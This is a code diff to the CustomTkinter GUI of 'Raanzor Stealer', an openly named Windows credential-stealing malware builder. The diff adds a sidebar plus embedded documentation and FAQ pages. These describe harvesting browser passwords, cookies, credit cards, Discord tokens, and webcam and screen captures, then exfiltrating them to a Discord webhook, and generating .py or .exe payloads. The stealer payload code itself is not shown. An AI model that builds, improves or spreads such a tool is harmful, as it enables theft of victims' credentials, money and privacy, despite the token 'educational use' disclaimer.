@@ -33,122 +33,142 @@ class RaanzorStealer(ctk.CTk):
         self.title("Raanzor Builder")
         self.geometry("1100x900")
         self.minsize(900, 800)
-        self.configure(bg="#1E1E1E")
+        ctk.set_appearance_mode("dark")
+        self.configure(bg="#121212")
 
-        self.build_top_frame()
-        self.build_webhook_frame()
-        self.build_checkbox_section()
-        self.build_status_label()
+        self.main_container = ctk.CTkFrame(self, fg_color="#121212")
+        self.main_container.pack(fill="both", expand=True)
 
-    def build_top_frame(self):
-        top_frame = ctk.CTkFrame(self, fg_color="#2B2B2B")
-        top_frame.pack(fill="x", pady=15, padx=15)
+        self.sidebar = ctk.CTkFrame(self.main_container, width=200, fg_color="#1A1A1A")
+        self.sidebar.pack(side="left", fill="y")
+
+        self.content = ctk.CTkFrame(self.main_container, fg_color="#121212")
+        self.content.pack(side="right", fill="both", expand=True)
 
         image_path = "asset/raanzor.png"
         pil_image = Image.open(image_path)
-        ctki_image = ctk.CTkImage(pil_image, size=(120, 120))
-        logo_label = ctk.CTkLabel(top_frame, image=ctki_image, text="")
+        ctki_image = ctk.CTkImage(pil_image, size=(100, 100))
+        logo_label = ctk.CTkLabel(self.sidebar, image=ctki_image, text="")
         logo_label.image = ctki_image
-        logo_label.pack(side="left", padx=10)
+        logo_label.pack(pady=20)
+
+        self.menu_buttons = [
+            ("Builder", self.show_builder),
+            ("Docu", self.show_documentation),
+            ("FAQ", self.show_faq)
+        ]
+
+        for label, command in self.menu_buttons:
+            btn = ctk.CTkButton(
+                self.sidebar,
+                text=label,
+                font=("Arial", 20, "bold"),  
+                text_color="black",  
+                fg_color="#8B0000",
+                hover_color="#FF0000",
+                command=command,
+                corner_radius=10,  
+                height=60
+            )
+            btn.pack(fill="x", padx=10, pady=5)
+
+        self.pages = {}
+        self.show_builder()
+
+    def clear_content(self):
+        for widget in self.content.winfo_children():
+            widget.destroy()
+
+    def show_builder(self):
+        self.clear_content()
+        self.build_top_frame()
+        self.build_webhook_frame()
+        self.build_checkbox_section()
+
+    def build_top_frame(self):
+        top_frame = ctk.CTkFrame(self.content, fg_color="#1A1A1A")
+        top_frame.pack(fill="x", pady=15, padx=15)
 
         title_label = ctk.CTkLabel(
             top_frame,
-            text="Raanzor Stealer",
-            font=("Arial", 42, "bold"),
-            text_color="#E53935",
+            text="RAANZOR STEALER",
+            font=("Consolas", 42, "bold"),
+            text_color="#FF0000"
         )
-        title_label.pack(side="left", padx=20)
+        title_label.pack(side="left", padx=30)
 
         right_buttons_frame = ctk.CTkFrame(top_frame, fg_color="transparent")
-        right_buttons_frame.pack(side="right", padx=10, pady=10)
+        right_buttons_frame.pack(side="right", padx=10)
 
         self.format_option = ctk.CTkComboBox(
             right_buttons_frame,
             values=["Python (.py)", "Executable (.exe)"],
-            width=160,
-            height=35,
-            fg_color="#2B2B2B",
-            dropdown_fg_color="#2B2B2B",
-            text_color="white",
+            width=180,
+            height=40,
+            fg_color="#1C1C1C",
+            dropdown_fg_color="#1C1C1C",
+            text_color="#FF6666",
             button_color="#8B0000",
-            button_hover_color="#B22222"
+            button_hover_color="#FF0000"
         )
         self.format_option.set("Python (.py)")
-        self.format_option.pack(side="left", padx=(0, 10))
+        self.format_option.pack(side="left", padx=5)
 
         self.generate_btn = ctk.CTkButton(
             right_buttons_frame,
-            text="Build",
-            width=110,
-            height=35,
+            text="⚙ Build",
+            width=160,
+            height=40,
+            font=("Arial", 16, "bold"),  # Changed font to Arial and made it bold
             fg_color="#8B0000",
-            hover_color="#B22222",
-            command=self.generate_script
+            hover_color="#FF0000",
+            text_color="black",  # Changed text color to black
+            command=self.generate_script,
+            corner_radius=10  # Added rounded corners
         )
-        self.generate_btn.pack(side="left")
+        self.generate_btn.pack(side="left", padx=5)
 
     def build_webhook_frame(self):
-        webhook_frame = ctk.CTkFrame(self, fg_color="#2B2B2B")
-        webhook_frame.pack(fill="x", padx=30, pady=(0, 15))
+        webhook_frame = ctk.CTkFrame(self.content, fg_color="#1A1A1A")
+        webhook_frame.pack(fill="x", padx=30, pady=(30, 15))
 
-        webhook_label = ctk.CTkLabel(webhook_frame, text="Webhook URL:", font=("Arial", 14), text_color="white")
+        webhook_label = ctk.CTkLabel(webhook_frame, text="Webhook URL:", font=("Consolas", 14), text_color="white")
         webhook_label.grid(row=0, column=0, sticky="w", padx=10, pady=10)
 
-        self.webhook_entry = ctk.CTkEntry(webhook_frame, width=400, placeholder_text="https://discord.com/api/webhooks/...")
+        self.webhook_entry = ctk.CTkEntry(webhook_frame, width=450, placeholder_text="https://discord.com/api/webhooks/...")
         self.webhook_entry.grid(row=0, column=1, sticky="ew", padx=10, pady=10)
 
         self.test_webhook_btn = ctk.CTkButton(
             webhook_frame,
             text="Test Webhook",
             fg_color="#8B0000",
-            hover_color="#B22222",
+            hover_color="#FF0000",
             command=self.test_webhook,
-            width=130,
-            height=30
+            width=150,
+            height=30,
+            font=("Arial", 14, "bold"),  # Changed font to Arial and made it bold
+            text_color="black",  # Changed text color to black
+            corner_radius=10  # Added rounded corners
         )
         self.test_webhook_btn.grid(row=0, column=2, padx=10, pady=10)
 
         webhook_frame.grid_columnconfigure(1, weight=1)
 
     def build_checkbox_section(self):
-        self.options = {
-            "System Info": ctk.BooleanVar(),
-            "IP Info": ctk.BooleanVar(),
-            "Clipboard": ctk.BooleanVar(),
-            "Browsers List": ctk.BooleanVar(),
-            "Antivirus List": ctk.BooleanVar(),
-            "Downloads List": ctk.BooleanVar(),
-            "Files on Desktop": ctk.BooleanVar(),
-            "Screenshot": ctk.BooleanVar(),
-            "Webcam Screen": ctk.BooleanVar(),
-            "Wi-Fi SSID": ctk.BooleanVar(),
-            "Kill All Programs": ctk.BooleanVar(),
-            "Kill Discord Client": ctk.BooleanVar(),
-            "Shutdown": ctk.BooleanVar(),
-            "Fake Error": ctk.BooleanVar(),
-            "Disconnect User": ctk.BooleanVar(),
-            "Browsers Passwords": ctk.BooleanVar(),
-            "Credit Cards": ctk.BooleanVar(),
-            "Discord Token": ctk.BooleanVar(),
-            "History": ctk.BooleanVar(),
-            "Cookies": ctk.BooleanVar(),
-            "Common Files": ctk.BooleanVar(),
-            "TskMgr Info": ctk.BooleanVar(),
-            "Shell History": ctk.BooleanVar(),
-            "IPConf": ctk.BooleanVar(),
-            "HWID": ctk.BooleanVar(),
-            "UUID": ctk.BooleanVar(),
-            "Discord Info": ctk.BooleanVar(),
-            "Credentials": ctk.BooleanVar(),
-            "Games": ctk.BooleanVar()
-        }
+        self.options = {name: ctk.BooleanVar() for name in [
+            "System Info", "IP Info", "Clipboard", "Browsers List", "Antivirus List", "Downloads List", "Files on Desktop",
+            "Screenshot", "Webcam Screen", "Wi-Fi SSID", "Kill All Programs", "Kill Discord Client", "Shutdown",
+            "Fake Error", "Disconnect User", "Browsers Passwords", "Credit Cards", "Discord Token", "History",
+            "Cookies", "Common Files", "TskMgr Info", "Shell History", "IPConf", "HWID", "UUID", "Discord Info",
+            "Credentials", "Games"
+        ]}
 
-        container = ctk.CTkFrame(self, fg_color="#2B2B2B")
+        container = ctk.CTkFrame(self.content, fg_color="#1A1A1A")
         container.pack(fill="both", expand=True, padx=30, pady=10)
 
-        canvas = tk.Canvas(container, bg="#2B2B2B", highlightthickness=0)
+        canvas = tk.Canvas(container, bg="#1A1A1A", highlightthickness=0)
         scrollbar = ctk.CTkScrollbar(container, orientation="vertical", command=canvas.yview)
-        scrollable_frame = ctk.CTkFrame(canvas, fg_color="#2B2B2B")
+        scrollable_frame = ctk.CTkFrame(canvas, fg_color="#1A1A1A")
 
         scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
         canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
@@ -170,10 +190,9 @@ class RaanzorStealer(ctk.CTk):
         row_idx = 0
 
         for category, opts in categories.items():
-            cat_label = ctk.CTkLabel(scrollable_frame, text=category, font=("Arial", 16, "bold"), text_color="#E53935")
+            cat_label = ctk.CTkLabel(scrollable_frame, text=category.upper(), font=("Consolas", 16, "bold"), text_color="#FF0000")
             cat_label.grid(row=row_idx, column=0, sticky="w", pady=(10, 5), columnspan=3)
             row_idx += 1
-
             col = 0
             for opt in opts:
                 checkbox = ctk.CTkCheckBox(
@@ -183,6 +202,7 @@ class RaanzorStealer(ctk.CTk):
                     text_color="white",
                     fg_color="#2B2B2B",
                     hover_color="#3E3E3E",
+                    border_color="#8B0000",
                     command=lambda v=opt: self.checkbox_color_update(v)
                 )
                 checkbox.grid(row=row_idx, column=col, sticky="w", padx=10, pady=3)
@@ -193,17 +213,153 @@ class RaanzorStealer(ctk.CTk):
                     row_idx += 1
             row_idx += 1
 
-    def build_status_label(self):
-        self.status_label = ctk.CTkLabel(self, text="", font=("Arial", 14), text_color="#E53935")
-        self.status_label.pack(pady=10)
-
     def checkbox_color_update(self, option_name):
         checkbox = self.checkboxes.get(option_name)
         if checkbox:
             if self.options[option_name].get():
-                checkbox.configure(fg_color="#E53935", text_color="white")
+                checkbox.configure(fg_color="#8B0000", text_color="white")
             else:
                 checkbox.configure(fg_color="#2B2B2B", text_color="white")
+
+    def show_documentation(self):
+        self.clear_content()
+        doc_text = """
+Tool Name: RaanzorStealerV2
+Version: 2.7
+Author: dsckazam
+Language: Python
+
+Description:
+RaanzorStealerV2 is an advanced information-gathering tool developed in Python, featuring a CustomTkinter GUI. It is designed to collect a wide range of sensitive data from Windows systems and transmit the results via a configurable webhook.
+
+Features:
+- System Information Collection:
+  - Retrieves IP address and system metadata
+  - Captures clipboard contents
+  - Detects installed antivirus software
+  - Lists saved Wi-Fi SSIDs
+
+- Browser Data Extraction:
+  - Extracts saved passwords from browsers
+  - Retrieves browsing history and cookies
+  - Collects stored credit card information
+
+- File and Media Capture:
+  - Takes screenshots of the desktop
+  - Captures images from the webcam
+
+- File Scanning:
+  - Scans Downloads and common directories for files
+
+- Process Control:
+  - Terminates specific programs, including Discord
+  - Shuts down the system
+  - Disconnects the user by disrupting network connectivity
+
+- Discord Integration:
+  - Extracts Discord tokens
+  - Controls Discord client processes
+
+- User Interaction:
+  - Displays custom fake error messages
+
+- Data Exfiltration:
+  - Sends collected data to a specified webhook URL
+
+Dependencies:
+- Python 3.x
+- CustomTkinter
+- Additional Python libraries as specified in requirements.txt
+
+Installation:
+1. Clone the repository or download the source code.
+2. Install dependencies:
+   pip install -r requirements.txt
+3. Configure the webhook URL and other settings in the configuration files.
+4. Run the builder script to generate the executable:
+   python builder.py
+
+Legal Disclaimer:
+This tool is intended for educational purposes and authorized penetration testing only. Unauthorized use is prohibited and may violate applicable laws. The developers are not responsible for any misuse of this tool.
+
+Use responsibly.
+        """
+
+        text_box = ctk.CTkTextbox(self.content, font=("Consolas", 14), fg_color="#1A1A1A", text_color="white")
+        text_box.pack(fill="both", expand=True, padx=20, pady=20)
+        text_box.insert("0.0", doc_text)
+        text_box.configure(state="disabled")
+
+    def show_faq(self):
+        self.clear_content()
+        faq_text = """
+FAQ - RaanzorStealerV2
+
+1. What is RaanzorStealerV2?
+RaanzorStealerV2 is an advanced information-gathering tool developed in Python with a CustomTkinter GUI. It collects various sensitive data from Windows systems and sends it via a Discord webhook.
+
+2. What is the purpose of this tool?
+- Collect system information (IP, antivirus, clipboard)
+- Extract browser passwords and cookies
+- Capture screenshots and webcam images
+- Scan common directories like Downloads
+- Control specific processes (Discord, shutdown)
+- Send collected data to a Discord webhook
+
+3. Is it legal to use RaanzorStealerV2?
+No. Using this tool without explicit authorization is illegal. It is intended for educational purposes, authorized penetration testing, or security research only.
+
+4. What are the prerequisites to use RaanzorStealerV2?
+- Python 3.x installed
+- Install dependencies via: pip install -r requirements.txt
+- A valid Discord webhook URL to receive data
+
+5. How do I configure the webhook?
+Go to the Webhook tab in the GUI, enter your full Discord webhook URL, and test the connection using the Test Webhook button.
+
+6. What output formats are supported?
+- Python script (.py)
+- Executable (.exe)
+
+7. What options can I customize for data collection?
+In the Options tab, you can enable or disable:
+- IP collection
+- Clipboard capture
+- Antivirus detection
+- Wi-Fi password extraction
+- Browser password retrieval
+- Screenshot and webcam capture
+- Directory scanning
+- Killing Discord process and system shutdown
+- Sending data to the webhook
+
+8. How do I generate the builder?
+Select the desired output format in the Build tab, then click the Build button to generate the script or executable.
+
+9. How can I verify that the tool works correctly?
+- Test the webhook in the Webhook tab
+- Make sure the desired options are enabled in Options
+- Check if data is being sent to the Discord webhook
+
+10. Does RaanzorStealerV2 work on Linux or macOS?
+No, it is designed specifically for Windows and certain features will not work on other operating systems.
+
+11. How can I contribute to the project?
+- Fork the GitHub repository
+- Submit improvements or bug fixes via pull requests
+- Respect the MIT license and usage guidelines
+
+12. What should I do if I encounter a bug or issue?
+Open an issue on the GitHub repository with a detailed description of the problem and your environment.
+
+13. Can I use this code for my own projects?
+Yes, provided you comply with the MIT license and use it legally and ethically.
+        """
+
+        text_box = ctk.CTkTextbox(self.content, font=("Consolas", 14), fg_color="#1A1A1A", text_color="white")
+        text_box.pack(fill="both", expand=True, padx=20, pady=20)
+        text_box.insert("0.0", faq_text)
+        text_box.configure(state="disabled")
 
     def show_message(self, message):
         self.status_label.configure(text=message)
